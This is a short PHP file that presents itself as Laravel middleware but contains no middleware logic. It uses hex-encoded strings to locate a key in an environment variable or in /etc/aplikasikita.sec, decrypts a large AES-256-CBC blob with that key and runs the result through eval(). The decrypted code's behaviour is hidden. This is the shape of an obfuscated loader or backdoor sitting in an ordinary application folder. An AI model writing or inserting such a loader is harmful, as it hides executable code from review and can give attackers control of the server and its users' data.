<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vjepFEep95xDWYdZtoxcDA==');

$c=base64_decode(

'O4+aPzR/wjPdcPEdNv2r93jKDaLOaIIcTsx2HSEUlUqSxOqmg8hSRW2nqWvLrB5PF6elHo9T/Bfc' .
'PzXIfp0NY5c2J/M3hpDtiGnhIT1YuZAdh3xWwI+g5gs4nphtOihBioyFr4v6qwzlAEOlOrPhgG7b' .
'baEwtDmX6jM/xlqT5VUvcUkgNkKWay3H2tAAQPt4wnpCYDBSDECqEAR46PwDVFR8hl5e9gef2sU2' .
'MTNJ86ov5Q6co+RqGBMpLy/AjLiD00jj8rmFknoo36kKlWPfHGKc5WRzTRdlYeG9+ExdAPTt/oWy' .
'XOR6EotQ4EM2YzPohzuh68dfkjh7g9NPGLg59hccnJ0m/zZ5SmSoguF1IIpIbVSqREgB/1wH6uF/' .
'U2bZzgioS3Lv3DbKhkHgANi819oKrAE/LYrDDVTZmar562Htm9r/dHbn9N9qy3wmiblJbv+VIKPY' .
'0Kh48roBAUVk5aDCZdEqz4VXaik562W/V93IssgYFwwFAuSxRwnG+5CEHfu0kY8tZgNuBPDfUeDZ' .
'0X/PkUL6h9K/bMeDdi7oqT37XVCn4eXLia+8UXgxVAWhL/KX5k+oayxAbmH0zqzAMUwhQBCaZJet' .
'9agkEEnzRhafAJ0T2HohgO6ZyCLDkwWy0CDKoi6tAalDvsdRsu6EQgKu2we2FnOGwBwxVtkMDTjc' .
'dFnLRzIaeJReAURnuQABiD7dBA8WE74q752RfFAGhUOCbhshSzEBVGe/rY0wqP6kADFKQF9vOhYJ' .
'0A6h7JUCw5aEOWiQCffe7c09J5Helsy5Uh37/k9/M0ifmoboqJAHVpxPRfa7bVb9Z/OfmrWUJWsX' .
'hd2XAhBbVHajpH6sgEIykloWCznpFGWUvpb2F8NviAFSveNjVfiVywyUiY7zKgJovsCO6U/faIw4' .
'DL5QmVwXdWNnxZTpZHg4Z3ACJRDL5aXunrDrSWEAcGuu6XuDYV3uN02nCq6w12Yx5EaoBb8sZbFB' .
'W4BikJk31IcOkChobo+m46yLUkapvHch3CGEz6E5R2NHaFgGbqpfeW8/PRWXARESYbV/QFvvTQYE' .
'HpMbHhREusMCjmwnyqNZ7co5hlFVy4tnLVTAI/h3vQs0OALjB0lTNE8+3AoU4bYeQk1+5gQajAbJ' .
'PoklqSoX2iY/OHNu66qzq0/i8wX/IAbT6EN2USpbv9zg6PqsMKLeP+kWZukBQXThol0hBEL+D/zb' .
'7uA7ezel8aeAT0XGXJ9Nh5qbY3bw2Hy2IhqwysyZradZ69i/rrClAI+5jzoMKAw0s/sMGxe2tQET' .
'vJXuKuz5uoAaHe6GVczr+szDKCFGVpir4kqGA7/wpfKIJJ9I1Nn0uelaYYHetHZYfwdfWqxhKjfE' .
'L3UYXeOJeZyK0ZrCHGfyzNZHuTB+qFJI/sy43sFE60jLQLP2SggDTwnL1wimXczczOS1FuNFfXJ7' .
'KM5ReJsyTOagUx4vnOXizZwjsb+SGlvGIUYLTVzThyX0yPT02AfaG8+BCvL6vJ/MClkt8UghOYUn' .
'0ZVFog9aWXQ6pH4RdsbO5o1UcTVqy5fBu7QjcA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

